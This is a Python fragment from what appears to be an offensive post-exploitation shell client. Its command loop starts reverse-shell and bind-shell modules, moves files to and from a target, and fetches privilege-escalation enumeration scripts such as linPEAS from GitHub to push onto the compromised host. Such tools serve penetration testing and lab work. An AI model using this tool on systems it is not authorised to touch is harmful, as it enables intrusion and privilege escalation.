    prompt_host = S.WriteCmd('hostname -s',fifo=False).strip('\n')

    def prompt_loop():
        prompt = f"Shell@{prompt_host}:> "
        
        try:
            print("[*] Type ? for help")
            while True:
                cmd = input(prompt)
                if not cmd:
                    pass
                else:
                    CustomInput = cmd.split()
                    Option = CustomInput[0]
                    if Option == '?':
                        S.Help('main')

                    elif Option.casefold() == '?set':
                        if len(CustomInput) >= 3:
                            param = CustomInput[1].lower()
                            value = CustomInput[2].lower()
                            S.SetParameter(param,value)
                        else:
                            S.Help('Set')
            
                    elif Option.casefold() == '?start':
                        if len(CustomInput) >= 3:
                            param = CustomInput[1].lower()
                            module = CustomInput[2].lower()
                            if param == '-m':
                                if module == 'upgrade': S.UpgradeShell()
                                elif module == 'revshell': S.RevShell()
                                elif module == 'bindshell': S.BindShell()
                                else:
                                    print(f'[ERROR] {module} is no valid module')
                                    S.Help('Start')
                        else:
                            print('[ERROR] Wrong ?start option')
                            S.Help('Start')

                    elif Option.casefold() == '?upload':
                        if len(CustomInput) == 2:
                            # cannot use space as strip seperator as it breaks a path with spaces
                            CustomInput = cmd.split('?upload')
                            upload_file = CustomInput[1].strip(' |"|\'')
                            S.UploadCmd(upload_file)
                        elif len(CustomInput) >= 3:
                            param = CustomInput[1].lower()
                            module = CustomInput[2].lower()
                            if param == '-m':
                                if module == 'linpeas': module_url = 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh'
                                elif module == 'exploit-suggester': module_url = 'https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh'
                                elif module == 'linenum': module_url = 'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh'
                                else:
                                    print(f'[ERROR] {module} is no valid module')
                                    S.Help('Upload')
                                # Download the file and upload it to the target
                                module_name = module_url.split('/')[-1]
                                downloaded_file = S.DownloadProg(module_url)
                                S.UploadCmd(downloaded_file, stream=True, name=module_name)
                            else:
                                print('[ERROR] Wrong ?upload option')
                                S.Help('Upload')
                        else:
                            S.Help('Upload')
                    
                    elif Option.casefold() == '?download':
                        if len(CustomInput) >= 2:
                            file_name = CustomInput[1]
                            S.DownloadFile(file_name)
                        else:
                            print('[ERROR] No download file specified')
                            S.Help('Download')

                    elif Option.casefold() == '?exit':
                        if len(CustomInput) >= 2:
                            set_attrib = CustomInput[1].lower()
                            if set_attrib == '-force':
                                S.killCmd(force=True)
                            if set_attrib == '-silent':
                                S.killCmd(silent=True)
                            else:
                                print(f'[ERROR] {set_attrib} not known; exit anyway')
                                S.killCmd()
                        else:
                            S.killCmd()
                    
                    elif Option.casefold() == '?resume':
                            S.session_resume()

                    elif Option.startswith('?'):
                        print(f'[ERROR] Function {Option} is unknown')
                        S.Help('main')
                    
                    else:
                        S.WriteCmd(cmd)
        except:
            pass

    # Listening for user input
    prompt_loop()